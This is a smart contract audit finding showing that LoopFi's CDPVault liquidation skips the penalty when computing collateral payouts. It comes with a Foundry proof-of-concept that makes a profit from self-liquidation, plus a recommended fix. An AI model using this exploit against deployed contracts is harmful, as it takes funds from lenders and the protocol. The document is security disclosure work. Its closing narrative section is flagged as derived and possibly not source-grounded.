---
id: 21696
severity: "High"
---

# Liquidation doesn’t account for penalty when calculating collateral to give, allowing users to profit by borrowing and self-liquidating

## Description

`CDPVault` allows users to borrow `underlying` from `PoolV3` by depositing collateral into the vault, such that the `(collateral value of their position / liquidationRatio) >= their current total debt`.

Users must repay their debt fully via `CDPVault::repay`, and the amount must cover their entire `current total debt`, which also includes various interest factors. If the value of their collateral divided by `liquidationRatio` is less than the debt of their position, then their position is considered `unsafe` and anyone can `liquidate` the position by buying the collateral at a `discount`. The amount spent by the caller is used to cover for the debt.

To ensure that users cannot profit from self liquidations, the `liquidatePosition` function incorporates a penalty mechanism, that is intended to deduct fees from the payment amount, which subsequently goes to the protocol as profit.

The problem is that when the `liquidatePosition` function calculates the collateral to give to the caller, it utilizes the repay amount _without_ the penalty, essentially functioning as if there is no penalty mechanism at all. The caller can specify any `repay amount`, and the collateral they receive will correspond directly to `repay amount / discount`, with no penalty.

This allows malicious users to profit by `deposit collateral -> borrow WETH -> have their position become unsafe -> buy collateral with WETH at a discount`. Malicious users can profit and steal funds from lenders and the protocol.

The natspec for the `CDPVault::liquidatePosition` states that “From that repay amount a penalty (`liquidationPenalty`) is subtracted to mitigate against profitable self liquidations.” 

However, we will see in the PoC how this has no impact against profitable self liquidations.

## Proof of Concept

The following block is executed when users repay their debt:

[CDPVault.sol#L402-L426](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/CDPVault.sol#L402-L426)

```solidity
} else if (deltaDebt < 0) {
    uint256 maxRepayment = calcTotalDebt(debtData);
    uint256 amount = abs(deltaDebt);
    if (amount >= maxRepayment) {
        amount = maxRepayment; // U:[CM-11]
        deltaDebt = -toInt256(maxRepayment);
    }

    poolUnderlying.safeTransferFrom(creditor, address(pool), amount);

    uint128 newCumulativeQuotaInterest;
    if (amount == maxRepayment) {
        newDebt = 0;
        newCumulativeIndex = debtData.cumulativeIndexNow;
        profit = debtData.accruedInterest;
        newCumulativeQuotaInterest = 0;
    } else {
        (newDebt, newCumulativeIndex, profit, newCumulativeQuotaInterest) = calcDecrease(
            amount, // delta debt
            position.debt,
            debtData.cumulativeIndexNow, // current cumulative base interest index in Ray
            position.cumulativeIndexLastUpdate,
            debtData.cumulativeQuotaInterest
        );
    }
}
```

For users to completely repay their loan, they must pay `maxRepayment` amount, which is calculated via a call to `calcTotalDebt`.

If the position is unsafe (`collateral value / liquidation ratio < total debt`), then anyone can liquidate it for a discount:

[CDPVault.sol#L521-L532](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/CDPVault.sol#L521-L532)

```solidity
// load price and calculate discounted price
uint256 spotPrice_ = spotPrice();
uint256 discountedPrice = wmul(spotPrice_, liqConfig_.liquidationDiscount);
if (spotPrice_ == 0) revert CDPVault__liquidatePosition_invalidSpotPrice();
// Ensure that there's no bad debt
if (calcTotalDebt(debtData) > wmul(position.collateral, spotPrice_)) revert CDPVault__BadDebt();

// compute collateral to take, debt to repay and penalty to pay
uint256 takeCollateral = wdiv(repayAmount, discountedPrice);
uint256 deltaDebt = wmul(repayAmount, liqConfig_.liquidationPenalty);
uint256 penalty = wmul(repayAmount, WAD - liqConfig_.liquidationPenalty);
```

There is also a penalty that the liquidator must pay (deducted from `repayAmount`). This is to mitigate profits from self-liquidation, as stated by the natspec of this function:

[CDPVault.sol#L503-L504](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/CDPVault.sol#L503-L504)

```solidity
/// ... From that repay amount a penalty (`liquidationPenalty`) is subtracted to mitigate against
/// profitable self liquidations ...
```

So the actual amount of debt repaid by the liquidator is `repayAmount - penalty`:

[CDPVault.sol#L538-L539](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/CDPVault.sol#L538-L539)

```solidity
// transfer the repay amount from the liquidator to the vault
poolUnderlying.safeTransferFrom(msg.sender, address(pool), repayAmount - penalty);
```

In the same call, the `penalty` is also transferred to the pool, taken as a profit for the protocol.

[CDPVault.sol#L567-L569](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/CDPVault.sol#L567-L569)

```solidity
// Mint the penalty from the vault to the treasury
poolUnderlying.safeTransferFrom(msg.sender, address(pool), penalty);
IPoolV3Loop(address(pool)).mintProfit(penalty);
```

However, there is a critical problem here. We can see that the intention here is that the caller pays `repayAmount - penalty` for the debt, and that the penalty goes towards profit.

This can be confirmed by observing the amount of debt that is covered via repayment:

[CDPVault.sol#L530](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/CDPVault.sol#L530)

```solidity
uint256 deltaDebt = wmul(repayAmount, liqConfig_.liquidationPenalty);
```

Note that `repayAmount * liqConfig_.liquidationPenalty` is equivalent to `repayAmount - penalty`. So the debt reduced is `repayAmount - penalty`. The problem is that the _collateral sent to the caller does not incorporate the penalty for liquidation_.

Essentially, this makes the `penalty` redundant, because the caller still receives the full `repayAmount` of collateral specified, including a `discount`.

A malicious user can perform the following attack scenario:
1. Deposit collateral via `CDPVault::deposit`.
2. Borrow WETH via `CDPVault::borrow`.
3. Have their position become unsafe (i.e., wait until enough debt interest is accrued such that `(collateral value of their position / liquidationRatio) < their current total debt`).
4. Fully buy back collateral at a discount.

Note: The value of the discount and penalty were chosen by observing the values currently set in `scripts/config.js`, they were not chosen arbitrarily.

Add the following to `test/unit/CDPVault.t.sol` and run `forge test --mt testSelfLiquidateProfit -vv`:

```solidity
function testSelfLiquidateProfit() public {
    mockWETH.mint(address(this), 20e18);

    // discount = 0.98 ether (0.02% discount)
    // penalty = 0.99 ether (0.01% penalty)
    CDPVault vault = createCDPVault(token, 150 ether, 0, 1.25 ether, 0.99 ether, 0.98 ether);
    createGaugeAndSetGauge(address(vault));

    // create position
    uint256 wethBefore = mockWETH.balanceOf(address(this));
    _modifyCollateralAndDebt(vault, 100 ether, 80 ether);
    uint256 wethBorrowed = mockWETH.balanceOf(address(this)) - wethBefore;
    uint256 collateralDeposited = 100 ether;
    console.log("weth borrowed: ", wethBorrowed);
    console.log("collateral deposited: ", collateralDeposited);
    
    address position = address(this);
    uint256 amountUserMustRepay = vault.virtualDebt(position);
    console.log("Amount of debt user must repay: ", amountUserMustRepay);

    // any attempt to liquidate now will revert because position is safe
    vm.expectRevert(bytes4(keccak256("CDPVault__liquidatePosition_notUnsafe()")));
    vault.liquidatePosition(position, 1 ether);

    // user waits some time for price to change so position becomes unsafe (but no bad debt yet)
    // in reality, interest will accrue, however to make this PoC simple we will update spot price (which is another way user can take advantage)
    _updateSpot(0.80 ether);
    (uint256 collateral, uint256 debt , , , , ) = vault.positions(position);

    // calculate amount to repay to fully liquidate position.
    uint256 spotAmt = oracle.spot(address(token));
    uint256 discountPercent = 0.98 ether;
    uint256 discountAmount = wmul(spotAmt, discountPercent);
    uint256 repayFull = wmul(collateral, discountAmount);
    console.log("Amount user is repaying: ", repayFull);
    mockWETH.approve(address(vault), repayFull);

    // fully liquidate position
    wethBefore = mockWETH.balanceOf(address(this));
    uint collateralBefore = token.balanceOf(address(this));
    vault.liquidatePosition(position, repayFull);
    uint256 wethSpent = wethBefore - mockWETH.balanceOf(address(this));
    uint256 collateralReceived = token.balanceOf(address(this)) - collateralBefore;
    console.log("weth spent: ", wethSpent);
    console.log("collateral received: ", collateralReceived);
    
    console.log("Total WETH earned: ", wethBorrowed - wethSpent);
    console.log("collateral lost: ", collateralDeposited -  collateralReceived);

    // confirm that collateral in position is 0
    (collateral, debt, , , , ) = vault.positions(position);
    console.log("collateral remaining in position: ", collateral);
}
```

[PASS] testSelfLiquidateProfit() (gas: 3761322)
Logs:
  weth borrowed:  80000000000000000000
  collateral deposited:  100000000000000000000
  Amount of debt user must repay:  80000000000000000000
  Amount user is repaying:  78400000000000000000
  weth spent:  78400000000000000000
  collateral received:  100000000000000000000
  Total WETH earned:  1600000000000000000
  collateral lost:  0
  collateral remaining in position:  0

Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 5.46ms

Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)

As displayed in the coded PoC, since the user receives the full amount of collateral without the penalty applied to the amount they receive, the user profits 1.6e18 WETH with the attack scenario described above.

## Recommendation

Apply the penalty to `repayAmount` when calculating the amount of collateral to give to the caller. In addition, ensure that the protocol applies a high enough penalty such that self-liquidators cannot profit from this attack.

```solidity
function liquidatePosition(address owner, uint256 repayAmount) external whenNotPaused {
    // validate params
    if (owner == address(0) || repayAmount == 0) revert CDPVault__liquidatePosition_invalidParameters();

    // load configs
    VaultConfig memory config = vaultConfig;
    LiquidationConfig memory liqConfig_ = liquidationConfig;

    // load liquidated position
    Position memory position = positions[owner];
    DebtData memory debtData = _calcDebt(position);

    // load price and calculate discounted price
    uint256 spotPrice_ = spotPrice();
    uint256 discountedPrice = wmul(spotPrice_, liqConfig_.liquidationDiscount);
    if (spotPrice_ == 0) revert CDPVault__liquidatePosition_invalidSpotPrice();
    // Ensure that there's no bad debt
    if (calcTotalDebt(debtData) > wmul(position.collateral, spotPrice_)) revert CDPVault__BadDebt();

    // compute collateral to take, debt to repay and penalty to pay
    uint256 deltaDebt = wmul(repayAmount, liqConfig_.liquidationPenalty);
    uint256 penalty = wmul(repayAmount, WAD - liqConfig_.liquidationPenalty);
    uint256 takeCollateral = wdiv(repayAmount - penalty, discountedPrice);
    if (takeCollateral > position.collateral) revert CDPVault__tooHighRepayAmount();

    // verify that the position is indeed unsafe
    if (_isCollateralized(calcTotalDebt(debtData), wmul(position.collateral, spotPrice_), config.liquidationRatio))
        revert CDPVault__liquidatePosition_notUnsafe();

    // transfer the repay amount from the liquidator to the vault
    poolUnderlying.safeTransferFrom(msg.sender, address(pool), repayAmount - penalty);

    uint256 newDebt;
    uint256 profit;
    uint256 maxRepayment = calcTotalDebt(debtData);
    uint256 newCumulativeIndex;
    if (deltaDebt == maxRepayment) {
        newDebt = 0;
        newCumulativeIndex = debtData.cumulativeIndexNow;
        profit = debtData.accruedInterest;
        position.cumulativeQuotaInterest = 0;
    } else {
        (newDebt, newCumulativeIndex, profit, position.cumulativeQuotaInterest) = calcDecrease(
            deltaDebt, // delta debt
            debtData.debt,
            debtData.cumulativeIndexNow, // current cumulative base interest index in Ray
            debtData.cumulativeIndexLastUpdate,
            debtData.cumulativeQuotaInterest
        );
    }
    position.cumulativeQuotaIndexLU = debtData.cumulativeQuotaIndexNow;
    // update liquidated position
    position = _modifyPosition(owner, position, newDebt, newCumulativeIndex, -toInt256(takeCollateral), totalDebt);

    pool.repayCreditAccount(debtData.debt - newDebt, profit, 0); // U:[CM-11]
    // transfer the collateral amount from the vault to the liquidator
    token.safeTransfer(msg.sender, takeCollateral);

    // Mint the penalty from the vault to the treasury
    poolUnderlying.safeTransferFrom(msg.sender, address(pool), penalty);
    IPoolV3Loop(address(pool)).mintProfit(penalty);

    if (debtData.debt - newDebt != 0) {
        IPoolV3(pool).updateQuotaRevenue(_calcQuotaRevenueChange(-int(debtData.debt - newDebt))); // U:[PQK-15]
    }
}
```

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability is a logical flaw in the liquidation routine of a CDP‑style vault where the penalty that is supposed to reduce the liquidator’s profit is never applied to the amount of collateral that the liquidator receives. The contract checks that a position is unsafe when the value of the deposited collateral divided by the liquidation ratio falls below the total debt, and then allows anyone to call liquidatePosition with a repay amount. The code correctly subtracts a liquidationPenalty from the repay amount before transferring the underlying token to the vault and records the penalty as protocol profit, but when it computes the amount of collateral to transfer back to the caller it uses the raw repay amount divided by the discounted price, ignoring the penalty. Consequently the liquidator effectively receives collateral worth repayAmount/discount even though only repayAmount‑penalty is used to cover debt. This mismatch lets an attacker open a position, borrow against it, let the position become unsafe (for example by accruing interest or by a price drop), and then self‑liquidate by repaying the debt with the borrowed asset. Because the penalty does not reduce the collateral payout, the attacker recovers the full collateral at a discount while only paying the reduced debt, generating a net profit in the underlying token. The impact is a direct loss of funds from lenders and the protocol treasury, as the attacker can repeatedly extract value without any risk of bad debt. The issue manifests only when a position is unsafe and a liquidation is attempted; safe positions revert as expected. Any user who can become the liquidator – including the borrower themselves – can exploit it, so both borrowers and external liquidators are affected. The flaw was discovered during a formal audit by reviewing the liquidation logic and noticing that the penalty variable was used for debt reduction but not for collateral calculation, a subtle inconsistency that does not raise an immediate error and therefore can be missed in functional testing. From a user’s perspective the symptom is that after a self‑liquidation the user’s wallet shows the same amount of collateral as before, while the borrowed token balance has increased, i.e., “my collateral didn’t decrease but I got more WETH”. This violates the economic assumption that liquidation penalties should offset any profit from liquidating one’s own position. The bug belongs to the class of accounting‑logic errors where fees or penalties are applied to one side of a transaction but not symmetrically to the other, leading to a profit‑leak. The recommended fix is to incorporate the penalty into the collateral calculation – for example by using (repayAmount‑penalty)/discount – and to ensure the penalty rate is high enough that the discounted collateral value does not exceed the net repayment, thereby restoring the intended loss‑making condition for self‑liquidation.
